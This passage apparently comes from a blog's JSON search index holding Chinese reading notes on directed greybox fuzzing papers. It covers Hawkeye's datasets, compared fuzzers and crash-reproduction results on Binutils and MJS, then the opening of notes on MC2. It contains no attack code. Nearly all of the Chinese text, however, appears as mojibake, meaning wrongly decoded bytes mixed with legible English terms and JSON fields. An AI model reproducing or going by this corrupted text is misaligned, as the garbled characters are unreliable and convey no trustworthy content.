é™æ€åˆ†æçœŸçš„å€¼å¾—ä»˜å‡ºåŠªåŠ›å—? é¹°çœ¼åœ¨é‡ç°ç›®æ ‡å´©æºƒæ–¹é¢çš„è¡¨ç°æœ‰å¤šå¥½? åœ¨ Hawkeye ä¸­åŠ¨æ€ç­–ç•¥çš„æ•ˆæœå¦‚ä½•? é¹°çœ¼åˆ°è¾¾ç‰¹å®šç›®æ ‡åœ°ç‚¹çš„èƒ½åŠ›å¦‚ä½•?\næ•°æ®é›† (1) GNU Binutils[5]æ˜¯ GNU/Linux å¹³å°ä¸Šä½¿ç”¨çš„äºŒè¿›åˆ¶åˆ†æå·¥å…·çš„é›†åˆã€‚è¯¥åŸºå‡†æµ‹è¯•ä¹Ÿç”¨äºå…¶ä»–ä¸€äº›ä½œå“ï¼Œå¦‚[6, 7, 24]ã€‚ (2) MJS[39]æ˜¯ä¸€ä¸ªç”¨äº C/ c++çš„åµŒå…¥å¼ JavaScript å¼•æ“ï¼Œç”¨äºç‰©è”ç½‘å¼€å‘ã€‚ç”±äº AFLGo åœ¨å®ç°ä¸Šçš„å±€é™æ€§ï¼Œå®ƒè¢«ç”¨æ¥ç›´æ¥æ¯”è¾ƒ Hawkeye å’Œ AFLGoã€‚ (3) Oniguruma[23]æ˜¯ä¸€ä¸ªé€šç”¨çš„æ­£åˆ™è¡¨è¾¾å¼åº“ï¼Œè¢«å¤šä¸ªä¸–ç•Œè‘—åçš„é¡¹ç›®ä½¿ç”¨ï¼Œå¦‚ PHP[33]ã€‚ (4) Fuzzer Test Suite[18]æ˜¯ä¸€å¥—ç”¨äºæ¨¡ç³Šå¼•æ“çš„åŸºå‡†æµ‹è¯•ã€‚å®ƒåŒ…å«äº†å‡ ä¸ªå…·æœ‰ä»£è¡¨æ€§çš„å®é™…é¡¹ç›®ã€‚\nè¯„ä¼°å·¥å…· (1) AFL æ˜¯ç›®å‰æœ€å…ˆè¿›çš„ GFã€‚å®ƒå¿½ç•¥ PUT çš„æ‰€æœ‰ç›®æ ‡ä¿¡æ¯ï¼Œåªæ‰§è¡Œâ€œåŸºæœ¬å—è½¬æ¢â€æ’è£…ã€‚ (2) AFLGo æ˜¯åŸºäº AFL çš„æœ€å…ˆè¿›çš„ DGFã€‚ä¸ AFL ç›¸æ¯”ï¼Œå®ƒè¿˜èƒ½æ˜¾ç¤ºåŸºæœ¬çš„å—è·ä¿¡æ¯ã€‚ (3) HE-Go æ˜¯æˆ‘ä»¬çš„é™æ€åˆ†æç¨‹åºç”ŸæˆåŸºæœ¬å—çº§è·ç¦»çš„æ¨¡ç³Šå™¨ (å›¾ 3)ï¼Œä½†åŠ¨æ€æ¨¡ç³Šæ˜¯ç”± AFLGo è¿›è¡Œçš„ã€‚\n5.2 é™æ€åˆ†æç»Ÿè®¡ Size è¡¨ç¤ºç¨‹åº LLVM bitcode å½¢å¼çš„å¤§å° Ics è¡¨ç¤ºäºŒè¿›åˆ¶æ–‡ä»¶ä¸­é—´æ¥è°ƒç”¨ call sites çš„æ•°é‡ï¼Œé€šè¿‡è®¡ç®—æ²¡æœ‰æ˜ç¡®å·²çŸ¥è¢«è°ƒç”¨è€…çš„è°ƒç”¨ç«™ç‚¹æ¥è®¡ç®— Cs è¡¨ç¤º call sites çš„æ•°é‡ ics/cs è¡¨ç¤ºæ‰€æœ‰è°ƒç”¨ç«™ç‚¹ä¸­é—´æ¥è°ƒç”¨çš„ç™¾åˆ†æ¯” æœ€åä¸€åˆ—è¡¨ç¤ºç”Ÿæˆè°ƒç”¨å›¾æ‰€éœ€çš„æ—¶é—´ï¼Œè¿™å æ®äº†å¤§éƒ¨åˆ†æ—¶é—´ã€‚ ä»è¡¨ä¸­å¯ä»¥çœ‹å‡ºï¼Œé—´æ¥è°ƒç”¨çš„å æ¯”è¿˜æ˜¯ç›¸å¯¹æ¯”è¾ƒå¤§çš„ï¼Œæ‰€ä»¥å»ºç«‹ç²¾ç¡®çš„è°ƒç”¨å›¾è¿˜æ˜¯å¾ˆæœ‰å¿…è¦çš„ CN \u0026gt; 1 å’Œ CB \u0026gt; 1 å‡ºç°æ¬¡æ•°ä¹Ÿå¾ˆå¤šï¼Œè¿™æ˜¾ç¤ºäº†è€ƒè™‘ä¸åŒæ¨¡å¼å‘¼å«å…³ç³»çš„é‡è¦æ€§\n5.3 å´©æºƒæš´éœ²èƒ½åŠ› åœ¨è¿™ä¸ªå®éªŒä¸­ï¼Œæˆ‘ä»¬ç›´æ¥æ¯”è¾ƒäº†Hawkeyeä¸å…¶ä»–æ¨¡ç³Šå™¨åœ¨ä¸€äº›å·²çŸ¥å´©æºƒä¸Šçš„å´©æºƒæš´éœ²èƒ½åŠ›ã€‚\né’ˆå¯¹ Binutils çš„å´©æºƒå†ç°ã€‚ èµ·åˆï¼Œæˆ‘ä»¬æ‰“ç®—åœ¨å®éªŒä¸­ç›´æ¥å°† GNU Binutils ä¸ AFLGo è¿›è¡Œæ¯”è¾ƒï¼Œå› ä¸ºå®ƒæ˜¯[6]ä¸­è¯æ˜ AFLGo å®šå‘æ€§çš„é‡è¦åŸºå‡†ã€‚ç„¶è€Œï¼Œæˆ‘ä»¬å‘ç° AFLGo åœ¨ç”Ÿæˆé™æ€è·ç¦»æ–¹é¢å­˜åœ¨ä¸€äº›é—®é¢˜[2]ã€‚æœ€é‡è¦çš„æ˜¯ï¼Œè®¡ç®—è·ç¦»éœ€è¦å¤ªé•¿æ—¶é—´ã€‚ç»“æœï¼Œåœ¨æˆ‘ä»¬å¯¹ GNU Binutils 2.26 è¿›è¡Œ AFLGo é™æ€åˆ†ææ—¶ï¼Œå®ƒæœªèƒ½åœ¨ 12 å°æ—¶å†…ç”ŸæˆåŒ…å«ä»ªå™¨è·ç¦»ä¿¡æ¯çš„â€œdistance. cfg. txtâ€5ã€‚å°½ç®¡ AFLGo ä»ç„¶å¯ä»¥åœ¨æ²¡æœ‰è·ç¦»ä¿¡æ¯ä»ªå™¨çš„æƒ…å†µä¸‹è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ï¼Œä½†å¦‚æœæ²¡æœ‰ä»»ä½•è·ç¦»è¾“å…¥ï¼Œæ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹å°±ä¸å†æ˜¯å®šå‘çš„ã€‚å› æ­¤ï¼Œæˆ‘ä»¬æ”¶å›äº†[6]ä¸­å…³äº GNU Binutils åŸºå‡†æµ‹è¯• 6 çš„ç»“æœä¸æˆ‘ä»¬çš„æ¯”è¾ƒã€‚æˆ‘ä»¬å®Œå…¨æŒ‰ç…§[6]ä¸­çš„è¯„ä¼°è®¾ç½®è¿›è¡Œæ¯ä¸ªå®éªŒ 20 æ¬¡ï¼Œæ—¶é—´é¢„ç®—è®¾ä¸º 8 å°æ—¶ï¼›åˆå§‹è¾“å…¥ç§å­æ–‡ä»¶åªåŒ…å«ä¸€ä¸ªæ¢è¡Œç¬¦ï¼ˆç”± echo â€œâ€ \u0026gt; in/file ç”Ÿæˆï¼‰ã€‚æˆ‘ä»¬æŒ‡å®šçš„ç›®æ ‡ç«™ç‚¹åŸºäºå®ƒä»¬çš„ CVE æè¿°å’Œå´©æºƒçš„å›æº¯ã€‚æˆ‘ä»¬å°† Hawkeye ä¸ AFLGo å’Œ AFL è¿›è¡Œæ¯”è¾ƒï¼›ç»“æœå¦‚è¡¨ 2 æ‰€ç¤ºã€‚åœ¨ AFLGo è®ºæ–‡ä¸­ï¼Œä½¿ç”¨äº† A12 åº¦é‡[42]æ¥æ˜¾ç¤ºæ ¹æ®æ‰€æœ‰è¿è¡Œæƒ…å†µä¸€ä¸ªæ¨¡ç³Šå™¨ä¼˜äºå¦ä¸€ä¸ªæ¨¡ç³Šå™¨çš„å¯èƒ½æ€§ã€‚ç”±äºæˆ‘ä»¬æ— æ³•è·å¾—ä»–ä»¬å®éªŒä¸­æ¯æ¬¡è¿è¡Œçš„ç»“æœï¼Œåœ¨è¡¨ 2 ä¸­å¿½ç•¥äº†è¿™ä¸€ç‚¹ã€‚ï¼ˆæ‡’å¾—æ€»ç»“ï¼Œç›´æ¥ç¿»è¯‘ï¼‰ ï¼ˆåœ¨å®éªŒä¸­ï¼ŒTTE é€šå¸¸æŒ‡çš„æ˜¯â€œæ—¶é—´åˆ°äº‹ä»¶â€ï¼ˆTime-To-Eventï¼‰ï¼Œå®ƒè¡¨ç¤ºä»å®éªŒå¼€å§‹åˆ°æŸä¸ªç‰¹å®šäº‹ä»¶å‘ç”Ÿæ‰€ç»è¿‡çš„æ—¶é—´ã€‚åœ¨æ¨¡ç³Šæµ‹è¯•ä¸­ï¼ŒTTE å¯ä»¥æŒ‡ä»æ¨¡ç³Šæµ‹è¯•å¼€å§‹åˆ°å‘ç°å´©æºƒæ‰€ç»è¿‡çš„æ—¶é—´ã€‚Î¼TTE æ˜¯â€œå¹³å‡æ—¶é—´åˆ°äº‹ä»¶â€ï¼ˆMean Time-To-Eventï¼‰çš„ç¼©å†™ï¼Œå®ƒè¡¨ç¤ºåœ¨å¤šæ¬¡å®éªŒä¸­ï¼Œä»å®éªŒå¼€å§‹åˆ°æŸä¸ªç‰¹å®šäº‹ä»¶å‘ç”Ÿæ‰€ç»è¿‡çš„å¹³å‡æ—¶é—´ã€‚åœ¨æ¨¡ç³Šæµ‹è¯•ä¸­ï¼ŒÎ¼TTE å¯ä»¥æŒ‡ä»æ¨¡ç³Šæµ‹è¯•å¼€å§‹åˆ°å‘ç°å´©æºƒæ‰€ç»è¿‡çš„å¹³å‡æ—¶é—´ã€‚ï¼‰ Run æ˜¯å‘½ä¸­æ¼æ´çš„è½®æ•°\né’ˆå¯¹ MJS çš„å´©æºƒé‡ç° ä¸ºäº†ç›´æ¥æ¯”è¾ƒHawkeyeå’ŒAFLGoçš„æ€§èƒ½ï¼Œæˆ‘ä»¬é€‰æ‹©äº†ä¸€ä¸ªåä¸ºMJSçš„é¡¹ç›®ï¼Œå®ƒåŒ…å«ä¸€ä¸ªæºæ–‡ä»¶ï¼Œç»“æœåœ¨è¡¨3ä¸­ã€‚æˆ‘ä»¬ä½¿ç”¨è¿™ä¸ªé¡¹ç›®ä¸AFLGoè¿›è¡Œç›´æ¥æ¯”è¾ƒï¼Œå› ä¸ºAFLGoèŠ±è´¹å¤ªå¤šæ—¶é—´æˆ–æ— æ³•ä¸ºå…¶ä»–é¡¹ç›®ï¼ˆå¦‚Onigurumaã€libpngç­‰ï¼‰ç”Ÿæˆè·ç¦»ä¿¡æ¯ã€‚åœ¨MJSä¸Šï¼ŒAFLGoå¹³å‡èŠ±è´¹13åˆ†é’Ÿç”Ÿæˆä¸åŒç›®æ ‡çš„åŸºæœ¬å—è·ç¦»ã€‚åœ¨å®éªŒè¿‡ç¨‹ä¸­ï¼Œåˆå§‹è¾“å…¥ç§å­æ–‡ä»¶éƒ½æ¥è‡ªé¡¹ç›®çš„æµ‹è¯•ç›®å½•ã€‚ç›®æ ‡æ˜¯ä»é¡¹ç›®çš„GitHubé¡µé¢æŠ¥å‘Šçš„å´©æºƒä¸­é€‰æ‹©çš„ï¼Œå®ƒä»¬å¯¹åº”å››ç±»æ¼æ´ï¼Œåˆ†åˆ«æ˜¯æ•´æ•°æº¢å‡ºï¼ˆ#1ï¼‰ã€æ— æ•ˆè¯»å–ï¼ˆ#2ï¼‰ã€å †ç¼“å†²åŒºæº¢å‡ºï¼ˆ#3ï¼‰å’Œä½¿ç”¨åé‡Šæ”¾ï¼ˆ#4ï¼‰ã€‚æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ°ä»¥ä¸‹äº‹å®ï¼š1ï¼‰åœ¨#1å’Œ#2ä¸Šï¼ŒHawkeyeå–å¾—äº†æœ€å¥½çš„ç»“æœï¼Œåœ¨ä¸¤ç§æƒ…å†µä¸‹éƒ½æœ‰æœ€å¤šçš„å‘½ä¸­è½®æ•°å’Œæœ€çŸ­çš„Î¼TTEã€‚å°±å‘½ä¸­è½®æ•°è€Œè¨€ï¼ŒHawkeyeåœ¨5æ¬¡è¿è¡Œä¸­å‘ç°äº†#1çš„é”™è¯¯ï¼Œåœ¨7æ¬¡è¿è¡Œä¸­å‘ç°äº†#2çš„é”™è¯¯ï¼Œè€Œå¯¹äºå¦å¤–ä¸¤ä¸ªå·¥å…·ï¼Œå®ƒä»¬åªåœ¨2æ¬¡è¿è¡Œä¸­æ£€æµ‹åˆ°ä¸¤æ¬¡å´©æºƒã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™ç§æƒ…å†µå¹¶éæ˜“äº‹ï¼Œå¹¶ä¸”Hawkeyeå°†Î¼TTEä»çº¦3.5å°æ—¶å‡å°‘åˆ°0.5å°æ—¶ã€‚2ï¼‰å¯¹äºæ‰€æœ‰å·¥å…·éƒ½åœ¨8è½®å†…é‡ç°å´©æºƒçš„#3æ¥è¯´ï¼ŒHawkeyeä»ç„¶åœ¨Î¼TTEæ–¹é¢å–å¾—äº†æå¤§æ”¹è¿›ï¼Œå¹¶ä¸”ä½¿ç”¨ä¸åˆ°å…¶ä»–å·¥å…·å››åˆ†ä¹‹ä¸€Î¼TTEã€‚3ï¼‰å¯¹äºæ‰€æœ‰å·¥å…·éƒ½åœ¨æ‰€æœ‰è½®æ¬¡å†…é‡ç°å´©æºƒå¹¶ä¸”å®ƒä»¬ä¹‹é—´Î¼TTEå·®å¼‚ä¸æ˜¾è‘—çš„#4æ¥è¯´ã€‚è‡³äºA12ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°Hawkeyeè¡¨ç°å‡ºéå¸¸å¥½çš„ç»“æœï¼Œä¾‹å¦‚ï¼Œåœ¨#2ä¸­å€¼éƒ½æ˜¯0.95 ï¼Œè¿™æ„å‘³ç€Hawkeyeæœ‰95% çš„æŠŠæ¡æ¯”å…¶ä»–ä¸¤ä¸ªå·¥å…·è¡¨ç°æ›´å¥½ã€‚ ï¼ˆåç»­åŸºæœ¬éƒ½æ˜¯å¯¹å®éªŒç»“æœçš„å±•ç¤ºï¼Œæ²¡æœ‰ä»€ä¹ˆæ€»ç»“çš„å¿…è¦ï¼‰\n5.6 æœ‰æ•ˆæ€§å¨èƒ å†…éƒ¨å¨èƒï¼ˆç¼ºé™·ï¼‰ï¼š\nå†…éƒ¨ç®—æ³•å­˜åœ¨å‡ ä¸ªé¢„å®šä¹‰çš„é˜ˆå€¼å› å­ï¼Œè¿™äº›å› å­çš„å€¼éƒ½æ˜¯ç»éªŒå€¼ï¼Œéœ€è¦è¿›è¡Œå®éªŒæ‰¾å‡ºæœ€ä½³é…ç½® é™æ€åˆ†æä¾èµ–çš„ LLVM å’Œ SVF å¯èƒ½ä¼šé€ æˆå½±å“ï¼Œæˆ–è®¸å¯ä»¥æ‰¾åˆ°æ›´å¥½çš„å·¥å…·æ¥é›†æˆ å¤–éƒ¨å¨èƒï¼š\nå®éªŒæ•°æ®é›†è¿˜æ˜¯ä¸å¤Ÿä¸°å¯Œ 6 ç›¸å…³å·¥ä½œ SeededFuzz [45] ä½¿ç”¨å„ç§ç¨‹åºåˆ†ææŠ€æœ¯æ¥ä¿ƒè¿›åˆå§‹ç§å­çš„ç”Ÿæˆå’Œé€‰æ‹©ï¼Œä»è€Œå¸®åŠ©å®ç°æœ‰å‘æ¨¡ç³Šæµ‹è¯•çš„ç›®æ ‡ã€‚é…å¤‡äº†æ”¹è¿›åçš„ç§å­é€‰æ‹©å’Œç”ŸæˆæŠ€æœ¯ï¼ŒSeededFuzz å¯ä»¥åˆ°è¾¾æ›´å¤šå…³é”®ç«™ç‚¹å¹¶å‘ç°æ›´å¤šæ¼æ´ã€‚\nDirected Symbolic Execution (DSE) æ˜¯ä¸€ç§ä¸ DGF ç›¸å…³çš„æŠ€æœ¯ï¼Œå®ƒä¹Ÿæ—¨åœ¨æ‰§è¡Œ PUT çš„ç›®æ ‡ç«™ç‚¹ã€‚å·²ç»æå‡ºäº†å‡ é¡¹ DSE å·¥ä½œ [17ã€19ã€21ã€28ã€29]ã€‚è¿™äº› DSE æŠ€æœ¯ä¾èµ–äºé‡é‡çº§ç¨‹åºåˆ†æå’Œçº¦æŸæ±‚è§£æ¥ç³»ç»Ÿåœ°åˆ°è¾¾ç›®æ ‡ç«™ç‚¹ã€‚\nä½†æ˜¯ DES æŠ€æœ¯å­˜åœ¨è·¯å¾„çˆ†ç‚¸é—®é¢˜ æ±¡ç‚¹åˆ†æä¹Ÿè¢«å¹¿æ³›ç”¨äºä¿ƒè¿›æœ‰å‘ç™½ç›’æµ‹è¯• [12ã€16ã€24ã€34ã€44]ã€‚åœ¨æ¨¡ç³Šæµ‹è¯•ä¸­ä½¿ç”¨æ±¡ç‚¹åˆ†æçš„å…³é”®ç›´è§‰æ˜¯ç¡®å®šè¾“å…¥çš„æŸäº›éƒ¨åˆ†åº”è¯¥ä¼˜å…ˆå˜å¼‚ã€‚è¿™æ ·ï¼Œæ¨¡ç³Šæµ‹è¯•å™¨å¯ä»¥å¤§å¤§å‡å°‘åˆ°è¾¾æŸäº›æœŸæœ›ä½ç½®çš„æœç´¢ç©ºé—´ã€‚\nFairfuzz [24] ä¸­çš„ç½•è§åˆ†æ”¯æˆ– TaintScope [44] ä¸­ä¸æ ¡éªŒå’Œç›¸å…³çš„ä»£ç ã€‚ ä½†æ˜¯ï¼Œç›®æ ‡æ˜ç¡®çš„åœºæ™¯ä¸‹ï¼Œå¦‚è¡¥ä¸æµ‹è¯•å’Œå´©æºƒå¤ç°ï¼Œè¿™äº›æŠ€æœ¯æ²¡æœ‰ä¼˜åŠ¿ã€‚ è¿™ä¸ªè²Œä¼¼åœ¨ MC2 ä¸­æœ‰æåŠï¼Œç­‰æˆ‘å»ç¿»ç¿»\nçœ‹ä¸€çœ‹å…¶ä»–èµ„æ–™ï¼Œææ‡‚é‚£ä¸ªæ‰§è¡Œè·Ÿè¸ªä¸ºå•¥æ²¡æœ‰ f\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/hawkeye-towards-a-desired-directed-grey-box-fuzzer/","summary":"ä¸­æ–‡è¯‘åï¼šhawkeye: éœ€æ±‚å¯¼å‘çš„ç°ç›’æ¨¡ç³Šæµ‹è¯• ä½œè€…ï¼šHongxu Chen å•ä½ï¼šå—æ´‹ç†å·¥å¤§å­¦ å›½å®¶ï¼š #æ–°åŠ å¡ å¹´ä»½ï¼š #2018å¹´ æ¥æºï¼š #ccs å…³é”®å­—ï¼š #å®šå‘","title":"Hawkeyeï¼š Towards a Desired Directed Grey-box Fuzzer"},{"content":"MC2 : ä¸¥æ ¼è€Œé«˜æ•ˆçš„å®šå‘ç°ç›’æ¨¡ç³Šæ³•\nabstract èƒŒæ™¯ï¼šmost existing directed greybox fuzzers do not provied any theoretical analysis of their performence or optimality.å¤§å¤šæ•°ç°æœ‰çš„æœ‰å‘ç°ç›’æ¨¡ç³Šå™¨éƒ½æ²¡æœ‰å¯¹å…¶æ€§èƒ½æˆ–æœ€ä¼˜æ€§æä¾›ä»»ä½•ç†è®ºåˆ†æã€‚\næ–¹æ³•ï¼š\nå¼•å…¥äº†ä¸€ä¸ªå¤æ‚æ€§ç†è®ºæ¡†æ¶ï¼Œå°†ç°ç›’æ¨¡ç³Šä½œä¸ºå…ˆçŸ¥å¼•å¯¼çš„æœç´¢é—®é¢˜ï¼Œé€šè¿‡æŸ¥è¯¢oracleæ¥æ¥æ”¶å…³äºè¾“å…¥ç©ºé—´çš„åé¦ˆã€‚ä½¿ç”¨æ¨¡ç³Šç®—æ³•å¯»æ‰¾ç›®æ ‡è¾¾åˆ°è¾“å…¥æ‰€éœ€çš„oracleæŸ¥è¯¢æ•°é‡ä½œä¸ºæ€§èƒ½æŒ‡æ ‡ã€‚ åŸºäºæ¡†æ¶ï¼Œè®¾è®¡äº†ä¸€ä¸ªéšæœºæœ‰å‘ç°ç›’æ¨¡ç³Šç®—æ³• æˆæœï¼šåœ¨å…·æœ‰æŒ‘æˆ˜æ€§çš„åŸºå‡†æµ‹è¯•(Magmaå’ŒFuzzeræµ‹è¯•å¥—ä»¶)ä¸­æ¯”æœ€å…ˆè¿›çš„å®šå‘ç°ç›’æ¨¡ç³Šå™¨çš„æ€§èƒ½å¹³å‡é«˜å‡ºä¸¤ä¸ªæ•°é‡çº§(å³134Ã—)ã€‚MC2è¿˜å‘ç°äº†15ä¸ªä»¥å‰æœªè¢«å‘ç°çš„bugï¼Œè¿™æ˜¯å…¶ä»–æœ€å…ˆè¿›çš„å®šå‘ç°ç›’æ¨¡ç³Šå™¨æ— æ³•å‘ç°çš„\nintroduction èƒŒæ™¯ï¼šæœ‰å‘ç°ç›’æ¨¡ç³Šæ˜¯ä¸€ç§æµè¡Œçš„å…·æœ‰é’ˆå¯¹æ€§çš„è½¯ä»¶æµ‹è¯•æŠ€æœ¯ï¼Œå½“ç»™å®šç¨‹åºä¸­çš„ä¸€ç»„ç›®æ ‡ç«™ç‚¹ï¼Œå®šå‘ç°ç›’æ¨¡ç³Šå™¨è‡ªåŠ¨æœç´¢ç¨‹åºçš„è¾“å…¥ç©ºé—´ï¼Œä»¥å¯»æ‰¾åˆ°è¾¾ç›®æ ‡çš„è¾“å…¥ã€‚ä½†ç”±äºç°å®ä¸–ç•Œç¨‹åºçš„è¾“å…¥ç©ºé—´éå¸¸å¤§ï¼Œå¤§å¤šæ•°ç°æœ‰çš„æœ‰å‘ç°ç›’æ¨¡ç³Šå™¨ä½¿ç”¨è¿›åŒ–ç®—æ³•ï¼Œå°†å…¶æœç´¢é›†ä¸­åœ¨é€šè¿‡å·¥å…·åŒ–ç¨‹åºæ‰§è¡Œä½¿ç”¨åé¦ˆä¿¡æ¯ç¡®å®šçš„æœ‰å¸Œæœ›çš„è¾“å…¥åŒºåŸŸã€‚ï¼ˆæ¯”å¦‚æ¨¡ç³Šå™¨ç»å¸¸æ”¶é›†å…³äºæ§åˆ¶æµå›¾è·ç¦»æˆ–ä¸ç›®æ ‡çš„åˆ†æ”¯çº¦æŸè·ç¦»çš„åé¦ˆä¿¡æ¯ï¼Œå¹¶ä¼˜å…ˆå¤„ç†æ¥è¿‘ç›®æ ‡çš„å˜å¼‚è¾“å…¥ï¼‰\né—®é¢˜ï¼šç°æœ‰çš„æœ‰å‘æ¨¡ç³Šå™¨æ²¡æœ‰æä¾›ä»»ä½•å…³äºå…¶æ€§èƒ½çš„ç†è®ºåˆ†æã€‚æ²¡æœ‰ä¸¥æ ¼çš„ç†è®ºç†è§£ï¼Œå°±å¾ˆéš¾ç†è§£æ¨¡ç³Šå™¨è®¾è®¡çš„å…³é”®æŒ‡å¯¼åŸåˆ™ã€‚ï¼ˆä½œè€…æå‡ºäº†å‡ ä¸ªç¤ºä¾‹é—®é¢˜ï¼šä»€ä¹ˆæ˜¯æœ€å¥½çš„ï¼ˆå³æœ€ä¼˜çš„ï¼‰å®šå‘æ¨¡ç³Šå™¨ï¼Ÿæ¨¡ç³Šç®—æ³•éšç€è¾“å…¥ç©ºé—´å¤§å°çš„å˜åŒ–è€Œå˜åŒ–çš„ç¨‹åº¦å¦‚ä½•ï¼Ÿä»€ä¹ˆæ ·çš„åé¦ˆä¿¡æ¯å¯¹æ¨¡ç³Šå¤„ç†æœ€æœ‰ç”¨ï¼Ÿä¸€ä¸ªç®—æ³•å¦‚ä½•æ‰èƒ½æœ€å¥½åœ°åˆ©ç”¨åé¦ˆï¼Ÿåœ¨ä½¿ç”¨è¿™ç§åé¦ˆä¿¡æ¯æ–¹é¢ï¼Œèƒ½å¦æ¯”è¿›åŒ–ç®—æ³•åšå¾—æ›´å¥½ï¼Ÿï¼‰\nå·¥ä½œï¼š\nå¤æ‚ç†è®ºæ¡†æ¶ï¼šå°†å…³äºä»ªå™¨å’Œæ¨¡ç³Šç®—æ³•ç±»å‹çš„å…·ä½“ç»†èŠ‚æŠ½è±¡åˆ°ä¸€ä¸ªç»Ÿä¸€çš„æ¡†æ¶ä¸­ã€‚æˆ‘ä»¬å°†æœ‰å‘ç°ç›’æ¨¡ç³Šå¤„ç†çš„ä»»åŠ¡å»ºæ¨¡ä¸ºä¸€ä¸ªç”²éª¨æ–‡å¼•å¯¼çš„æœç´¢é—®é¢˜ï¼šæ‰¾åˆ°åˆ°è¾¾ç›®æ ‡çš„è¾“å…¥ï¼Œç»™å®šæŸ¥è¯¢è®¿é—®æ‰§è¡Œç¨‹åºçš„ç”²éª¨æ–‡ï¼Œå¹¶å‘æ¨¡ç³Šå¤„ç†ç®—æ³•æ­ç¤ºä¸€äº›å…³äºæœç´¢ç©ºé—´çš„ä¿¡æ¯ï¼ˆå³æœ‰å¸Œæœ›çš„è¾“å…¥åŒºåŸŸçš„èº«ä»½ï¼‰ã€‚ æ‰§è¡Œçš„å¤æ‚æ€§ï¼šå¼•å…¥äº†æ‰§è¡Œå¤æ‚åº¦çš„æ¦‚å¿µï¼Œè¿™æ˜¯ä¸€ä¸ªæ¸è¿‘åº¦é‡æ¡†æ¶ä¸­ä»»ä½•æ¨¡ç³Šç®—æ³•çš„æ€§èƒ½çš„æŒ‡æ ‡ã€‚å…¶å€¼æ˜¯æ ¹æ®æ¨¡ç³Šå™¨åœ¨æ‰¾åˆ°åˆ°è¾¾ç›®æ ‡ç«™ç‚¹çš„è¾“å…¥ä¹‹å‰è¿›è¡Œçš„oracleæŸ¥è¯¢çš„æ•°é‡ã€‚ ä¸€ä¸ªæœ€ä½³çš„æ¨¡ç³Šç®—æ³•ï¼šå¼•å…¥äº†ä¸€ç§ç‰¹æ®Šç±»å‹çš„ç”²éª¨æ–‡ï¼Œç§°ä¸ºå™ªå£°è®¡æ•°ç”²éª¨æ–‡ã€‚åŸºäºå™ªå£°è®¡æ•°ç”²éª¨æ–‡å’Œåˆ†ææ¡†æ¶è®¾è®¡äº†ä¸€ä¸ªæ¨¡ç³Šç®—æ³• ç”¨è’™ç‰¹å¡æ´›è¿›è¡Œè¿‘ä¼¼è®¡æ•°ï¼šæˆ‘ä»¬å¼€å‘äº†ä¸€ç§è’™ç‰¹å¡æ´›ç®—æ³•ï¼Œç”¨äºå®ç°æˆ‘ä»¬çš„éšæœºå®šå‘ç°ç›’æ¨¡ç³Šç®—æ³•ï¼Œä½†æ˜¯ä½œè€…æŒ‡å‡ºè¿™æ ·å®¹æ˜“æŠŠåˆ°è¾¾ç›®æ ‡æ•°ä¼°è®¡æˆé›¶ï¼Œå› ä¸ºåœ¨å®è·µä¸­ï¼Œå¤§å¤šæ•°æ¨¡ç³Šç›®æ ‡ç‚¹åªèƒ½ç”±æ»¡è¶³ä¸€ä¸ªæˆ–å¤šä¸ªåˆ†æ”¯çº¦æŸçš„å°‘é‡è¾“å…¥åˆ°è¾¾ã€‚æ‰€ä»¥ä¸ºäº†å…‹æœè¿™ä¸ªé—®é¢˜ï¼Œä½œè€…è®¤ä¸ºå³ä½¿æ²¡æœ‰æ‰¾åˆ°è¾¾åˆ°ç›®æ ‡çš„å°‘æ•°è¾“å…¥ï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥ä»¥é«˜ç½®ä¿¡åº¦è®¡ç®—å‡ºä¸€ä¸ªè®¡æ•°çš„ä¸Šç•Œã€‚ï¼ˆä¸å¤ªæ‡‚ï¼‰ æµ“åº¦èŒƒå›´ã€‚å¯ä»¥ä½¿ç”¨æµ“åº¦ç•Œæ¥æ¨å¯¼æ»¡è¶³åˆ†æ”¯çº¦æŸçš„å¯èƒ½æ€§çš„ä¸Šç•Œ æ²¿ç€å¤šä¸ªåˆ†æ”¯è¿›è¡Œè®¡æ•°ã€‚å¯¹äºä»»ä½•ç»™å®šçš„åˆ°è¾¾ç›®æ ‡çš„è·¯å¾„ï¼Œæˆ‘ä»¬è¿‘ä¼¼åœ°è®¡ç®—æ»¡è¶³ä¸Šè¿°è·¯å¾„ä¸­æ¯ä¸ªåˆ†æ”¯çš„è¾“å…¥æ•°é‡ï¼Œå¹¶å°†å®ƒä»¬ç»“åˆèµ·æ¥ï¼Œå¾—åˆ°åˆ°è¾¾ç›®æ ‡çš„è¾“å…¥æ•°é‡çš„ä¼°è®¡å€¼ã€‚ è®²å®è¯ï¼Œè¯»å®Œå¼•è¨€æ„Ÿè§‰è¿™ç¯‡æœ‰ç‚¹æŠ½è±¡å•Šã€‚\nmethodology æœ¬èŠ‚ä½œè€…æå‡ºä¸€ä¸ªé€šç”¨å¤æ‚ç†è®ºæ¡†æ¶ç”¨äºåœ¨oracleå¼•å¯¼æœç´¢é—®é¢˜ä¸­æ¨è®ºæœ€å¥½çš„å®šå‘ç°ç›’æ¨¡ç³Šå™¨ã€‚ ç„¶åç”¨è¿™ä¸ªæ¡†æ¶æä¸€ä¸ªå™ªå£°è®¡æ•°oracleï¼Œç”¨è¿™ä¸ªoracleå»ºç«‹ä¸€ä¸ªä¼˜åŒ–çš„å®šå‘ç°ç›’æ¨¡ç³Šå™¨ã€‚ 2.1 terminology and notation ç›®æ ‡ç¨‹åºä¸ºP åœ¨æ¨¡ç³Šå¤„ç†è¿‡ç¨‹ä¸­è¦æ¢ç´¢çš„å¤§è€Œæœ‰é™çš„è¾“å…¥ç©ºé—´è¡¨ç¤ºä¸ºI input regionï¼šæ˜¯è¾“å…¥ç©ºé—´Içš„å­é›†ã€‚ paiï¼šè¡¨ç¤ºCFGä¸­çš„ä¸€æ¡æœ‰ç©·è·¯å¾„ P(i)ï¼šè¾“å…¥ä¸ºiçš„ç¨‹åºPçš„æ‰§è¡Œç»“æœ 2.2 A framework for directed greybox fuzzing 